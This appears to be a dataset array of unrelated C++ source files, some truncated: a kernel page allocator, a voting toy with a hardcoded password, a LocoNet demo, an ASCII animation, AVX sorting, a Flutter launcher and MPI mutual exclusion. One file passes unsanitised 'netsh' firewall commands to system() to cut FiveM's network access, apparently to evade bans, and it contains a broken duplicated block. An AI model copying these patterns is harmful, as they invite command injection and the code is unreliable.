    "#include <Kernel/Memory/map.hpp>\n#include <Kernel/Memory/page.hpp>\n#include <Lib/IO/Stream/iostream>\n#include <Lib/STL/string>\n#include <Lib/Base/deflib.hpp>\n#include <Arch/Arch.hpp>\n#include <Kernel/task.hpp>\nPUBLIC namespace {\n    PUBLIC using namespace QuantumNEC::Lib::IO;\n    PUBLIC using namespace QuantumNEC;\n    PUBLIC using namespace QuantumNEC::Kernel;\n\n    PRIVATE Lib::Types::Ptr< VOID > buffer_4k { };\n    PRIVATE TaskLock lock { };\n}\n\nPUBLIC namespace QuantumNEC::Kernel {\n    PageMemory::PageMemory( IN Lib::Types::Ptr< Lib::Types::BootConfig > _config ) noexcept {                        // \u8ba1\u7b97\u53ef\u7528\u5185\u5b58\u6570\u91cf\n        Lib::Types::Ptr< Lib::Types::EfiMemoryDescriptor > efi_memory_descriptor { _config->memory_map.Buffer };     // memory map\n        bitmap_.set_length( MEMORY_PAGE_DESCRIPTOR );\n        bitmap_.set_bits( page_descriptor_entry );\n        auto check_memory_type = [ &, this ]( Lib::Types::size_t n ) -> MemoryPageAttribute {\n            switch ( efi_memory_descriptor[ n ].Type ) {\n            case Lib::Types::EfiMemoryType::EfiConventionalMemory:\n            case Lib::Types::EfiMemoryType::EfiBootServicesCode:\n            case Lib::Types::EfiMemoryType::EfiBootServicesData:\n            case Lib::Types::EfiMemoryType::EfiLoaderCode:\n            case Lib::Types::EfiMemoryType::EfiLoaderData:\n                return MemoryPageAttribute::FREE_MEMORY;     // \u53ef\u7528\u7a7a\u95f2\u5185\u5b58\n            case Lib::Types::EfiMemoryType::EfiRuntimeServicesCode:\n            case Lib::Types::EfiMemoryType::EfiRuntimeServicesData:\n            case Lib::Types::EfiMemoryType::EfiMemoryMappedIO:\n            case Lib::Types::EfiMemoryType::EfiMemoryMappedIOPortSpace:\n            case Lib::Types::EfiMemoryType::EfiPalCode:\n            case Lib::Types::EfiMemoryType::EfiReservedMemoryType:\n                return MemoryPageAttribute::RESERVED_MEMORY;     // \u4fdd\u7559\u5185\u5b58\n            case Lib::Types::EfiMemoryType::EfiACPIReclaimMemory:\n                return MemoryPageAttribute::ACPI_MEMORY;     // ACPI \u4fdd\u7559\u5185\u5b58\n            case Lib::Types::EfiMemoryType::EfiACPIMemoryNVS:\n                return MemoryPageAttribute::ACPI_MEMORY_NVS;     // ACPI \u53ef\u56de\u6536\u5185\u5b58\n            case Lib::Types::EfiMemoryType::EfiUnusableMemory:\n            case Lib::Types::EfiMemoryType::EfiMaxMemoryType:\n                return MemoryPageAttribute::UNUSEABLE_MEMORY;     // \u4e0d\u53ef\u7528\u5185\u5b58\n            default:\n                return MemoryPageAttribute::UNDEF_MEMORY;     // \u5176\u4ed6\u672a\u5b9a\u4e49\u5185\u5b58\n            }\n        };\n        for ( Lib::Types::size_t i { }; i < _config->memory_map.MemoryCount; ++i ) {\n            MemoryPageAttribute type { check_memory_type( i ) };\n            Lib::Types::uint64_t start { efi_memory_descriptor[ i ].PhysicalStart }, end { start + ( efi_memory_descriptor[ i ].NumberOfPages << 12 ) };\n            this->general_memory_total = end;\n            if ( type == MemoryPageAttribute::FREE_MEMORY ) {     // \u5982\u679c\u4e3a\u7a7a\u95f2\u5185\u5b58\n                // \u8ba1\u7b97\u5185\u5b58\u9875\u8fb9\u754c\n                start = Lib::Base::DIV_ROUND_UP( start, PAGE_SIZE );\n                end = end / PAGE_SIZE;\n                // \u7edf\u8ba1\u7a7a\u95f2\u5185\u5b58\n                if ( end >= start ) {\n                    this->memory_total += ( end - start ) * PAGE_SIZE;\n                }\n            }\n            else {\n                // \u8ba1\u7b97\u5185\u5b58\u9875\u8fb9\u754c\n                start = start / PAGE_SIZE;\n                end = Lib::Base::DIV_ROUND_UP( end, PAGE_SIZE );\n                // \u5c06\u8fd9\u90e8\u5206\u5185\u5b58\u6dfb\u52a0\u81f3bitmap\n                for ( Lib::Types::uint64_t j { start }; j < end; ++j ) {\n                    this->bitmap_.set( j, 1 );\n                }\n            }\n        }\n\n        if ( ( this->general_memory_total / PAGE_SIZE ) < MEMORY_PAGE_DESCRIPTOR ) {\n            this->bitmap_.set_length( this->general_memory_total / PAGE_SIZE );\n        }\n\n        sout[ ostream::HeadLevel::SYSTEM ] << \"OS Can Use Memory : \" << this->memory_total / 1_MB << \" MB\";\n        // \u663e\u793a\u53ef\u7528\u5185\u5b58\u6570\n        if ( auto GB_memory_total { ( this->memory_total + 28_MB ) / 1_MB / 1_KB }; GB_memory_total ) {\n            sout << \" <=> \" << GB_memory_total << \" GB\";\n        }\n        endl( sout );\n        buffer_4k = malloc_2M_page( 20 );\n    }\n    auto PageMemory::malloc( IN Lib::Types::size_t size, IN MemoryPageType type )->Lib::Types::Ptr< VOID > {\n        lock.acquire( );\n        switch ( type ) {\n        case MemoryPageType::PAGE_4K:\n            lock.release( );\n            return malloc_4K_page( size );\n        case MemoryPageType::PAGE_2M:\n            lock.release( );\n            return malloc_2M_page( size );\n        case MemoryPageType::PAGE_1G:\n            lock.release( );\n            return malloc_1G_page( size );\n        default:\n            lock.release( );\n            return NULL;\n        };\n    }\n    auto PageMemory::free( IN Lib::Types::Ptr< VOID > address, IN Lib::Types::size_t size, IN MemoryPageType type )->VOID {\n        lock.acquire( );\n        switch ( type ) {\n        case MemoryPageType::PAGE_4K:\n            free_4K_page( address, size );\n            break;\n        case MemoryPageType::PAGE_2M:\n            free_2M_page( add",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nbool checkPassword() {\r\n    string correctPassword = \"hahahe\"; \r\n    string inputPassword;\r\n\r\n    cout << \"Enter password to vote: \";\r\n    cin >> inputPassword;\r\n\r\n    if (inputPassword == correctPassword) {\r\n        return true;\r\n    } else {\r\n        cout << \"Incorrect password. Try again.\" << endl;\r\n        return false;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int candidate1 = 0, candidate2 = 0, candidate3 = 0;  //program is designed only for 3 candidtes change if you needa\r\n    int voters, vote;\r\n    \r\n    cout << \"Welcome!\\n\";\r\n\r\n    cout << \"Enter the number of voters: \";\r\n    cin >> voters;\r\n    \r\n    for (int i = 1; i <= voters; i++) {\r\n        cout << \"\\nVoter #\" << i << \":\\n\";\r\n        \r\n        while (!checkPassword()) {\r\n        }\r\n    \r\n        cout << \"Candidates:\\n\";\r\n        cout << \"1. Candidate A\\n\";\r\n        cout << \"2. Candidate B\\n\";\r\n        cout << \"3. Candidate C\\n\";\r\n        \r\n        cout << \"Enter your vote (1, 2, or 3): \";\r\n        cin >> vote;\r\n        \r\n        switch (vote) {\r\n            case 1:\r\n                candidate1++;\r\n                cout << \"You voted for Candidate A.\\n\";\r\n                break;\r\n            case 2:\r\n                candidate2++;\r\n                cout << \"You voted for Candidate B.\\n\";\r\n                break;\r\n            case 3:\r\n                candidate3++;\r\n                cout << \"You voted for Candidate C.\\n\";\r\n                break;\r\n            default:\r\n                cout << \"Invalid vote, please enter 1, 2, or 3.\\n\";\r\n                i--;  // Redo this voter's turn if the vote was invalid\r\n        }\r\n    }\r\n    \r\n    // Display the election results\r\n    cout << \"\\nElection Results:\\n\";\r\n    cout << \"Candidate A: \" << candidate1 << \" votes\\n\";\r\n    cout << \"Candidate B: \" << candidate2 << \" votes\\n\";\r\n    cout << \"Candidate C: \" << candidate3 << \" votes\\n\";\r\n    \r\n    // Determine the winner\r\n    if (candidate1 > candidate2 && candidate1 > candidate3) {\r\n        cout << \"+++++++++++Candidate A wins the election!+++++++++++\\n\";\r\n    } else if (candidate2 > candidate1 && candidate2 > candidate3) {\r\n        cout << \"+++++++++++Candidate B wins the election!+++++++++++\\n\";\r\n    } else if (candidate3 > candidate1 && candidate3 > candidate2) {\r\n        cout << \"\\n +++++++++++Candidate C wins the election!+++++++++++\\n\";\r\n    } else {\r\n        cout << \"It's a tie!\\n\";\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "\n#define ARDUINO_ESP32_MCU_esp32\n\n#include <LocoNetStreamESP32.h>\n\nLocoNetBus bus;\n\n#define LOCONET_PIN_RX 22\n#define LOCONET_PIN_TX 23\n#define LOCONET_UART_SIGNAL_INVERT_RX false\n#define LOCONET_UART_SIGNAL_INVERT_TX true\n\n#include <LocoNetStream.h>\nLocoNetDispatcher parser(&bus);\nLocoNetStreamESP32 lnStream(1, LOCONET_PIN_RX, LOCONET_PIN_TX, LOCONET_UART_SIGNAL_INVERT_RX, LOCONET_UART_SIGNAL_INVERT_TX, &bus);\n\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all Sensor messages\nvoid notifySensor( uint16_t Address, uint8_t State ) {\n  Serial.print(\"Sensor: \");\n  Serial.print(Address, DEC);\n  Serial.print(\" - \");\n  Serial.println( State ? \"Active\" : \"Inactive\" );\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all Switch Request messages\nvoid notifySwitchRequest( uint16_t Address, uint8_t Output, uint8_t Direction ) {\n  Serial.print(\"Switch Request: \");\n  Serial.print(Address, DEC);\n  Serial.print(':');\n  Serial.print(Direction ? \"Closed\" : \"Thrown\");\n  Serial.print(\" - \");\n  Serial.println(Output ? \"On\" : \"Off\");\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all Switch Output Report messages\nvoid notifySwitchOutputsReport( uint16_t Address, uint8_t ClosedOutput, uint8_t ThrownOutput) {\n  Serial.print(\"Switch Outputs Report: \");\n  Serial.print(Address, DEC);\n  Serial.print(\": Closed - \");\n  Serial.print(ClosedOutput ? \"On\" : \"Off\");\n  Serial.print(\": Thrown - \");\n  Serial.println(ThrownOutput ? \"On\" : \"Off\");\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all Switch Sensor Report messages\nvoid notifySwitchReport( uint16_t Address, uint8_t State, uint8_t Sensor ) {\n  Serial.print(\"Switch Sensor Report: \");\n  Serial.print(Address, DEC);\n  Serial.print(':');\n  Serial.print(Sensor ? \"Switch\" : \"Aux\");\n  Serial.print(\" - \");\n  Serial.println( State ? \"Active\" : \"Inactive\" );\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all Switch State messages\nvoid notifySwitchState( uint16_t Address, uint8_t Output, uint8_t Direction ) {\n  Serial.print(\"Switch State: \");\n  Serial.print(Address, DEC);\n  Serial.print(':');\n  Serial.print(Direction ? \"Closed\" : \"Thrown\");\n  Serial.print(\" - \");\n  Serial.println(Output ? \"On\" : \"Off\");\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all Power messages\nvoid notifyPower(uint8_t State) {\n  Serial.print(\"Layout Power State: \");\n  Serial.println(State ? \"On\" : \"Off\");\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all MultiSensePower messages\nvoid notifyMultiSensePower(uint8_t BoardID, uint8_t Subdistrict, uint8_t Mode, uint8_t Direction) {\n  Serial.print(\"MultiSensePower: Board ID: \");\n  Serial.print(BoardID, DEC);\n  Serial.print(\" Sub District: \");\n  Serial.print(Subdistrict, DEC);\n  Serial.print(\" Mode: \");\n  Serial.print(Mode, DEC);\n  Serial.print(\" Direction: \");\n  Serial.println(Direction, DEC);\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all Sensor messages\nvoid notifySensorB(uint8_t address, uint8_t block, bool State) {\n  Serial.printf(\"SensorB: address=%d block=%d present=%d\\n\",\n  address, block, State);\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all notifyMultiSenseTransponder messages\nvoid notifyMultiSenseTransponderB(uint8_t address, uint8_t block, uint16_t locoAddress, bool present, bool locoDirection) {\n  Serial.printf(\"MultiSenseTransponderB: address=%d block=%d locoAddress=%d present=%d locoDirection=%s\\n\",\n  address, block, locoAddress, present, OPC_MULTI_SENSE_B_LOCO_DIRECTION_STRING(locoDirection));\n}\n\n// This call-back function is called from LocoNet.processSwitchSensorMessage\n// for all LongAck messages\n\nvoid notifyLongAck(uint8_t d1, uint8_t d2) {\n  Serial.print(\"LongACK : Data Byte 1: \");\n  Serial.print(d1, DEC);\n  Serial.print(\" Data Byte 2: \");\n  Serial.println(d2, DEC);\n\n}\n\nvoid setup() {\n  \n  Serial.begin(115200);\n  Serial.println(\"LocoNet2 Basic Demo\");\n\n  lnStream.start();\n\n  parser.onPacket(CALLBACK_FOR_ALL_OPCODES, [](const lnMsg *rxPacket) {\n      char tmp[100];\n      formatMsg(*rxPacket, tmp, sizeof(tmp));\n      Serial.printf(\"onPacket: %s\\n\", tmp);\n  });\n\n  parser.onSensorChangeB(notifySensorB);\n  parser.onSwitchRequest(notifySwitchRequest);\n  parser.onSwitchReport(notifySwitchReport);\n  parser.onSwitchState(notifySwitchState);\n  parser.onPowerChange(notifyPower);\n  parser.onMultiSenseTransponderB(notifyMultiSenseTransponderB);\n  parser.onMultiSenseDeviceInfo(notifyMultiSensePower);\n\n}\n\nuint16_t sensorIndex = 0;\n\nvoid loop() {\n  lnStream.process();\n\n  delay(10);\n}\n",
    "#include<curses.h>\r\n#include<iostream>\r\n#include<chrono>\r\n#include<cstdlib>\r\n\r\n#define FRAMERATE (100)\r\n#define FPS (1000/(FRAMERATE))\r\n#define MILLISEC() (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count())\r\n#define rf() wrefresh(stdscr)\r\n#define mv(x, y) wmove(stdscr, (y), (x))\r\n#define TINY ((LINES >= 3) && (COLS >= 5))\r\n#define SMALL ((LINES >= 6) && (COLS >= 20))\r\n#define MEDIUM ((LINES >= 12) && (COLS >= 40))\r\n/* not implemented.\r\n#define LARGE ((LINES >= 28) && (COLS >= 80))\r\n#define LARGER ((LINES >= 56) && (COLS >= 160))\r\n*/\r\nusing namespace std;\r\n\r\n// MEDIUM frames\r\nstring medium[20]={R\"(                                        \r\n                                        \r\n                                        \r\n                                        \r\n                                        \r\n                                        \r\n                                        \r\n                .                       \r\n          )QCYOwZZf'                    \r\n        \"|YXC0c0xvX).                   \r\n           `>_t_I^                      )\",R\"(                                        \r\n                                        \r\n                                        \r\n                                        \r\n         .mm*bdCaCb{.                   \r\n      `JwhkkbddOdbdapJ                  \r\n       hmmdZdapbwmwbOdp00               \r\n     .`0hkphbakkbbdkhkpdh               \r\n     'Zmdabab*haddaho*Zm                \r\n         .rkk*o*k|                      \r\n            'k>c.                       )\",R\"(                                        \r\n                                        \r\n                                        \r\n        pkh*hokoa#aha'                  \r\n    .bohooa#ahhkbkkhhp<                 \r\n    hao###MM#aha*oh#bh*                 \r\n     *a*haoa*MM**ahk#o*h#b.             \r\n     .kb*ha#h*#ohbkh**#*#o.             \r\n     .kz\"`*ao*#W##dhMWoc.               \r\n        .kkwb#B##apt...                 \r\n            bbkhd..                     )\",R\"(                                        \r\n                                        \r\n      .BMWBWbpB#M*WWi.                  \r\n      B*o#B$$BBB$$BBMWBM.               \r\n  .BBWBBBBBBBBBBBBBMMW$B.               \r\n  'BMB$#BMB$BWB$BBWBBBBB.               \r\n   .WB#$BBB$#B#WWBBBWBMB$W<.            \r\n     ###BMBBMBo$BBBB$WBB*W#`            \r\n       ..'.WWv**BM.YW$h[^`              \r\n      .\"!+kC{cMbhdda_,'                 \r\n          ..o0bfX!. ''                  )\",R\"(                                        \r\n          mM*M.ao*#Bm,                  \r\n     aBW#bbko$M$$WW$$*@$                \r\n     mobbbk$B$B$$$$$$$BB$<              \r\n .$$MMM*o*BBBBB$BBB$$$$$$k              \r\n 'B*MBWBBWBBBBBBBBB$MW$$$.              \r\n  .MBBBBaBMBBBBBBBBBB$#$BBk.            \r\n     WBBa0W#hh*h#*#odopaQOp*            \r\n       .'   `_/J00 I/[f[/>.             \r\n     '`Il~<_+)tjj]_nz;<'.               \r\n        .  :_[[_}_Il`:^.                )\",R\"(            +} pph*##'                  \r\n      Q**Qdmbaabmha*WW$b`               \r\n    rCkhmZZ0BW##*#bka#h*Mx              \r\n   ..mp0QJJdkwkOmkM0mwWpw#.             \r\n 'ZMhw0QJObwmwpmZmd#mmoamho             \r\n ICYCCQQQC0mmmbmpdpdwwpo#..             \r\n  .zY0w0QQww000ZmhwbQJmOwbCr            \r\n     ,0CJzzJ;1xYzXj}fXvf0Owr|           \r\n        ..  '-_/z}\",_\"i)[(\"             \r\n     ,\"!I+_->[|1]1<1f~;i..              \r\n       ''  :<]-][_l;,\"l.                )\",R\"(        '0m0mpdpfckddk#Wk.              \r\n     .0bwCOJJ0pommChooMMo#.             \r\n    jYQhYcczh*#*bhoJCZwaoobY            \r\n    .nCXcvczOCm0YQpCvvXmkcOd            \r\n  fZpXvvvxzzzvnnnvCCxnzh0JQk.           \r\n  YzvnnnxxnnxxxxxxxxxnYzQ!;             \r\n  \"nxxvvnnvccxjjjtxxjrrxCZOc .          \r\n      tnvrj|t.I</f'.{|[|{XC1)Y          \r\n           .,]~[/+,';''!:!j'            \r\n    .,\"ii]}_+~}{1)[]-x-I'.              \r\n       '  .:+]]}[-!I::^'.               )\",R\"(       \"zJ0dZmpoZQOOQ0h*h*BZ            \r\n     `YYYXcXYzXbZJXXddpdo**a            \r\n    iJmmXccvcYoMOCbaXQQZphkwII          \r\n   :. JXzcvzdwQdmzYOonvXJdYZJ`          \r\n  i0dzzcvvzXzXzvvncJpnncOZJQd           \r\n  vCcvvvxxxnnxxxxxnxjxvJC/_(            \r\n  ^rrxxnvvnrnvr1[|}]}{txYJQ]r1'         \r\n        f),[{\" `,!, ^}<{1|Y}Itv         \r\n           `i>!_-|>^.I..''/'            \r\n    .`:i>+{{~~-_-)|[])/<`               \r\n       .  .;]]}}{]+>I;''.               )\",R\"(       XvCYCCYYZoZmz0CcbadhkM;          \r\n     ,YXzzccvncZCnnnxmpQXzOao|          \r\n    .QCYXcvnvcXbaxmkaJCmbbabO.          \r\n   .x'!cccvvddb0dpJCmoxnYYZ0Zw]         \r\n   xpnzccvcQJXzYzcvzYzvvJ0p0O>          \r\n  <Qccvvnxxnvjxnxxxnx[jvQn/)i           \r\n   txjrrxnnxjrn/[<)`]]}jcYx]j{|'        \r\n            `,!..`:  \";<~)n(I;~i        \r\n           .i>>_<_]\"'':'. `-.           \r\n    .\";I-+1{++>-_||)[(t{'.              \r\n       . 'Il]}[[{-~~l`'..               )\",R\"(      .vzXXYzccXCJYXJcvvnwhhopW'        \r\n     }fQXXznxnncXxxxxnxCxnnzmOO         \r\n    .xvJcccvnxnznxxdphdnYOdkzX.         \r\n    `+`tvcz",
    "#include \"network.hpp\"\r\n#include \"trace.hpp\"\r\n\r\nvoid network::block_connection(std::string process)\r\n{\r\n\tstd::string outbound = \"netsh advfirewall firewall add rule name = \" + process + \" dir = out program = \" + process + \"  action = block\";\r\n\tsystem(outbound.c_str());\r\n\r\n\tstd::string inbound = \"netsh advfirewall firewall add rule name = \" + process + \" dir = in program = \" + process + \"  action = block\";\r\n\tsystem(inbound.c_str());\r\n}\r\n\r\nvoid network::unblock_connection(std::string process)\r\n{\r\n\tstd::string outbound = \"netsh advfirewall firewall delete rule name = \" + process + \" dir = out program = \" + process;\r\n\tsystem(outbound.c_str());\r\n\r\n\tstd::string inbound = \"netsh advfirewall firewall delete rule name = \" + process + \" dir = in program = \" + process;\r\n\tsystem(inbound.c_str());\r\n}\r\n\r\nvoid network::setup()\r\n{\r\n\t// Locate FiveM.exe\r\n\tauto fivem_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.exe\";\r\n\tblock_connection(fivem_path);\r\n\r\n\r\n\t// Locate FiveM Subprocesses path\r\n\tauto subprocess_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.app\" + \"\\\\\" + \"data\" + \"\\\\\" + \"cache\" + \"\\\\\" \"subprocess\";\r\n\r\n\tstd::vector<std::string> gta_versions{ \"b2545_\", \"b2372_\", \"b2189_\", \"b2060_\",  \"\" };\r\n\r\n\tfor (auto processes : gta_versions)\r\n\t{\r\n\t\t// Block the gta processes\r\n\t\tauto gta_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"GTAProcess.exe\";\r\n\t\tblock_connection(gta_process);\r\n\r\n\t\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\t\r\n\t\tblock_connection(steam_process);\r\n\t}\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\tblock_connection(steam_process);\r\n\r\n}\r\n\r\n\r\nvoid network::destroy()\r\n{\r\n\t// Locate FiveM.exe\r\n\tauto fivem_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.exe\";\r\n\tunblock_connection(fivem_path);\r\n\r\n\t// Locate FiveM Subprocesses path\r\n\tauto subprocess_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.app\" + \"\\\\\" + \"data\" + \"\\\\\" + \"cache\" + \"\\\\\" \"subprocess\";\r\n\r\n\tstd::vector<std::string> gta_versions{ \"b2545_\", \"b2372_\", \"b2189_\", \"b2060_\",  \"\" };\r\n\r\n\tfor (auto processes : gta_versions)\r\n\t{\r\n\t\t// Block the gta processes\r\n\t\tauto gta_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"GTAProcess.exe\";\r\n\t\tunblock_connection(gta_process);\r\n\r\n\t\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\tunblock_connection(steam_process);\r\n\t}\r\n}\r\n",
    "#include \"PmergeMe.hpp\"\n\nvoid compare_pairs_avx_deque(std::deque<std::pair<int, int> >& pairs) \n{\nsize_t n = pairs.size();\n    check_alignment(&pairs[0], 32);\n    size_t block_size = 64;  // Tile size: number of bytes that fit into a cache line\n\n    for (size_t block_start = 0; block_start < n; block_start += block_size) \n    {\n        size_t block_end = std::min(block_start + block_size, n);\n        size_t i = block_start;\n\n        for (; i + 8 <= block_end; i += 8) \n        {\n            if (i + 8 < block_end)\n                _mm_prefetch((const char*)&pairs[i + 8], _MM_HINT_T0);\n\n            __m256i first = _mm256_set_epi32(\n                pairs[i + 7].first, pairs[i + 6].first, pairs[i + 5].first, pairs[i + 4].first,\n                pairs[i + 3].first, pairs[i + 2].first, pairs[i + 1].first, pairs[i + 0].first);\n            __m256i second = _mm256_set_epi32(\n                pairs[i + 7].second, pairs[i + 6].second, pairs[i + 5].second, pairs[i + 4].second,\n                pairs[i + 3].second, pairs[i + 2].second, pairs[i + 1].second, pairs[i + 0].second);\n            __m256i min_values = _mm256_min_epi32(first, second);\n            __m256i max_values = _mm256_max_epi32(first, second);\n            int results_min[8], results_max[8];\n            _mm256_storeu_si256((__m256i*)results_min, min_values);\n            _mm256_storeu_si256((__m256i*)results_max, max_values);\n\n            for (int j = 0; j < 8; ++j) \n            {\n                if (i + j + 8 < block_end)\n                    _mm_prefetch((const char*)&pairs[i + j + 8], _MM_HINT_T0);\n                pairs[i + j].first = results_min[j];\n                pairs[i + j].second = results_max[j];\n            }\n        }\n\n        // Handle the remaining elements in the block\n        for (; i < block_end; ++i) \n        {\n            int min_value = std::min(pairs[i].first, pairs[i].second);\n            int max_value = std::max(pairs[i].first, pairs[i].second);\n            pairs[i].first = min_value;\n            pairs[i].second = max_value;\n        }\n    }\n}\n\n\nvoid insertion_deque(std::deque<int>& arr, int value) \n{\n    int left = 0;\n    int right = arr.size() - 1;\n    int pos = arr.size();\n\n    while (left <= right)\n    {\n        int mid = left + (right - left) / 2;\n\n        if (arr[mid] < value) \n            left = mid + 1;\n        else \n        {\n            pos = mid;\n            right = mid - 1;\n        }\n    }\n\n    arr.insert(arr.begin() + pos, value); \n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"denden_homepage\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <mpi.h>\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\n#include <unistd.h>\n\n#define REQUEST_TAG 1\n#define REPLY_TAG 2\n#define RELEASE_TAG 3\n\n/*\nName - Myint Myat Thura\nID - 31861067\n\nInstructions :\n\nJust run the makefile by typing \"make\" in the command line.\nYou may read the output by finding the process with the lowest start time, and you may see\nthat the code does indeed work. The proof of correctness is done by splitting up the process printing \ninto seperate files. Please refer to the recording for more details.\n\nMAKE FILE CODE :\n\nCC = mpicc\nCFLAGS =\nLDFLAGS = -lm\nEXECUTABLE = Output\nNP = 4\n\n.PHONY: all run clean\n\nall: $(EXECUTABLE) run\n\n$(EXECUTABLE): main.c\n\t$(CC) $(CFLAGS) $< -o $@ $(LDFLAGS)\n\nrun: $(EXECUTABLE)\n\t@echo \"Number of processes: 4\"\n\t@echo \"Logical Clock Start Time : Random\"\n\t@echo \"Sleep: 2s\"\n\tmpirun -oversubscribe -np $(NP) ./$(EXECUTABLE)\n\nclean:\n\trm -f $(EXECUTABLE)\n\n    \n*/\n\nstruct Request {\n    int timestamp;\n    int rank;\n};\n\n// Function to compare timestamps or ranks\nbool compare_requests(const Request &a, const Request &b) {\n    if (a.timestamp == b.timestamp) return a.rank < b.rank;\n    return a.timestamp < b.timestamp;\n}\n\nint main(int argc, char **argv) {\n    MPI_Init(&argc, &argv);\n\n    int world_size, world_rank;\n    MPI_Comm_size(MPI_COMM_WORLD, &world_size);\n    MPI_Comm_rank(MPI_COMM_WORLD, &world_rank);\n\n    std::ofstream outfile(\"output_\" + std::to_string(world_rank) + \".txt\");\n\n    MPI_Datatype MPI_REQUEST;\n    MPI_Type_contiguous(2, MPI_INT, &MPI_REQUEST);\n    MPI_Type_commit(&MPI_REQUEST);\n\n    bool requesting = false;\n    srand(time(NULL) + world_rank);\n    int clock = rand() % 10;\n    std::vector<Request> request_queue;\n    int replies_needed = world_size - 1;\n    int replies_received = 0;\n\n    // Start of the algorithm\n    for (int i = 0; i < 2; ++i) {\n        ++clock;\n        requesting = true;\n        Request my_request = {clock, world_rank};\n        request_queue.push_back(my_request);\n        std::sort(request_queue.begin(), request_queue.end(), compare_requests);\n\n        // Send request to all other processes\n        outfile << \"Process \" << world_rank << \" sending requests at time \" << clock << std::endl;\n        outfile.flush();\n        for (int j = 0; j < world_size; ++j) {\n            if (j != world_rank) {\n                MPI_Send(&my_request, 1, MPI_REQUEST, j, REQUEST_TAG, MPI_COMM_WORLD);\n                outfile << \"Process \" << world_rank << \" sent request to Process \" << j << std::endl;\n                outfile.flush();\n            }\n        }\n\n        // Wait for replies from all other processes\n        while (replies_received < replies_needed) {\n            MPI_Status status;\n            MPI_Probe(MPI_ANY_SOURCE, MPI_ANY_TAG, MPI_COMM_WORLD, &status);\n            int source = status.MPI_SOURCE;\n            int tag = status.MPI_TAG;\n\n            if (tag == REQUEST_TAG) {\n                Request incoming_request;\n                MPI_Recv(&incoming_request, 1, MPI_REQUEST, source, REQUEST_TAG, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n                outfile << \"Process \" << world_rank << \" received request from Process \" << source << \" at time [ \" << clock << \" ]\" << std::endl;\n                outfile.flush();\n                clock = std::max(incoming_request.timestamp, clock) + 1;\n                request_queue.push_back(incoming_request);\n                std::sort(request_queue.begin(), request_queue.end(), compare_requests);\n                MPI_Send(nullptr, 0, MPI_INT, source, REPLY_TAG, MPI_COMM_WORLD);\n                outfile << \"Process \" << world_rank << \" sent reply to Process \" << source << \" at time [ \" << clock << \" ]\" << std::endl;\n                outfile.flush();\n            } else if (tag == REPLY_TAG) {\n                MPI_Recv(nullptr, 0, MPI_INT, source, REPLY_TAG, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n                outfile << \"Process \" << world_rank << \" received reply from Process \" << source << \" at time [ \" << clock << \" ]\" << std::endl;\n                outfile.flush();\n                ++replies_received;\n            } else if (tag == RELEASE_TAG) {\n                MPI_Recv(nullptr, 0, MPI_INT, source, RELEASE_TAG, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n                outfile << \"Process \" << world_rank << \" received release from Process \" << source << std::endl;\n                outfile.flush();\n                auto it = std::remove_if(request_queue.begin(), request_queue.end(),\n                                         [source](const Request &r) { return r.rank == source; });\n                request_queue.erase(it, request_queue.end());\n            }\n        }\n\n        // Enter critical section\n        outfile << \"Process \" << world_rank << \" entering critical section at time [ \" << clock << \" ]\" << std::endl;\n        outfile.flush();\n        sleep(2);  // Sleep for 2 seconds\n        outfile << \"Process \" << world_rank << \" exiting critical section at time [ \" << clock << \" ]\" << std::endl;\n       ",
